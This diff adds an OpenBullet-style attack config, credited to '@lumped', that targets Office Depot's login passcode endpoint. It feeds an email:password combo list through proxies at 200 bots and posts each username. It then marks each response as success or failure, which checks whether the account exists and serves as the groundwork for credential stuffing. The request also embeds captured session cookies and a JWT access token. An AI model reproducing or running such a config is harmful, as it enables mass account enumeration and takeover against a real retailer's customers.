@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Office Depot VM(@lumped)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-20T19:06:45.6268683+01:00",
+  "AdditionalInfo": "",
+  "Author": "@lumped",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "USERR" 
+
+REQUEST POST "https://www.officedepot.com/json/smartEnroll/passcodeDelivery.do" 
+  CONTENT "loginName=<USERR>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 28" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "cookie: SameSite=None; GEO_LONG=-9.13; GEO_LAT=38.72; GEO_POSTAL=33496; GEO_CITY=LISBON; GEO_STATE=FL; CU_ACT=false; IBSD_LOCALE=en_US; CU_BRAND=OD; JSESSIONID=00008oEIsrrSfqAP9gIp-cjc67R:17h4h7bfo; AccessToken=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlAxZ3VXbHZEY0g0bDVEWWt3OE9XN0pmZnNhTXp5cXhVZkxiN212TzhzVWJOamt1ViJ9.eyJzdWIiOiJHVUVTVCIsInNpZ25hdHVyZSI6IjFhUU91IiwiaXNzIjoiT0QiLCJzZXNzaW9uSWQiOiIwMDExMzkwIiwiaW52TG9jRGZ0IjoiMTE2NSIsImF1ZCI6IldBUlAiLCJlbnZpcm9ubWVudCI6Im5vZGU1Iiwia2p0IjoiZmFsc2UiLCJkY2lkIjoiSjgyNDk3MTkzLWUyNWQtNDBiZC1hZGRjLTk5YmYzZTEyYmJjZiIsImlkZW50aXR5IjoidGdhaHRhZnR3c3B4Y24iLCJpc0Fub24iOiJ0cnVlIiwidXNlclR5cGUiOiJQIiwiZXhwIjoxNjE1MTk4NTI1LCJpYXQiOjE2MTUxOTc2MjUsImp0aSI6ImNhNTc2NDlhLTEyZDItNDYxYS1hMzIzLTYxMzE5YzhjODg3ZCIsInNpdGVUeXBlIjoiSiJ9.Uh9J6dce6ewMIfvchCSGwVg1igIDuGKGfFKim9J-sUcuMETBZFF2_1wE-vr_RwfoE0vtQeIu-RgkF4ZLVUNcpmaztVINIcJVOpn5UbylP4vLU9kqJJLuG34B_tRobyZYZYP7G3sX-dqZfPA0b0D-c3tblhZ1S1Zm6kyPGVJ--zTloU-ZiAosEDhbbuwWYY-79HLgCTjEy5TFEX5UU7udZVDmQHtVgyJtMIL7ylxf7XDlikmP_K1Yeo_DHUgrUCSxqb2nSJQJ7a_WOD603qReOXyRbbq5NXVj82wvjLz30Gl4EMvr_dE6ZlvWlauakdIj3wBXv6d7gkCTNxjVkeBjnw; REQ_UNQ_ID=c2b3e673e00e4d0fbe24281aabda5c19; CID_CART_COOKIE=8oEIsrrSfqAP9gIp-cjc67R; ssessid=00008oEIsrrSfqAP9gIp-cjc67R; mt.v=5.1211636957.1615197625349; jsession_unique_id=1615197625328; bm_sz=D829BD0EA424A55D379169FD694718CA~YAAQpuoWAj5h/853AQAACt1HEQueBKm3dU3FS60+psvZX5V6H4Wwu5zdHN1RaHqXTFFG/LaHL/2uM0L7vSV9Uty/540mtHQCBZPe0QPLwOf5YERjShYgwDRTXL9Z5r98cLXtrqU+LhUh8WhLIRkgdkkWpEjUNa62YjvrECmYbYncqVOZMzITldMUUBf6pH8a0goSGtU=; _abck=9E2FFF3EBAEA11D02892ABE4094E831C~0~YAAQpuoWAlNh/853AQAA1AZIEQV0Sm6jY2vZXdAeuJi08k5F6F/bvlT1EM7W0pDXgDrLuioSREGaXg8OrKVldDg76ey7hzcxFVElclO/ffx7C5CyCWip2DYcUtFrP0IXU/XnngomuRbnQ0UvmZbPfyT8QWHWBIcAzCRqTolkvQHvpCpoCyxiT+RJnVmMk89T4A/f8vMtObgzIzJgPX5XDxxMsOf/IGfdJEsTJv8SNKjyHrtN+1zxS+G/HfPcNzVfozDLUAfstT1tMB6wqNBMoXrHxWE+Lyor5bhc0sRw6njgINMn/1krSaiDbp6arF/iYy9yQnatPFWXhzJJtk010T7KBH2AY30xYbKLowxBgLD+/dl6AoVeshjnTHOkDNchzjeC5ma23pgrPc2rb9Tz3qymDJVoS66XiJ5yF7Y=~-1~||-1||~-1" 
+  HEADER "origin: https://www.officedepot.com" 
+  HEADER "referer: https://www.officedepot.com/account/loginAccountDisplay.do" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+
+FUNCTION Constant "@lumped" -> VAR "Config By" 
+
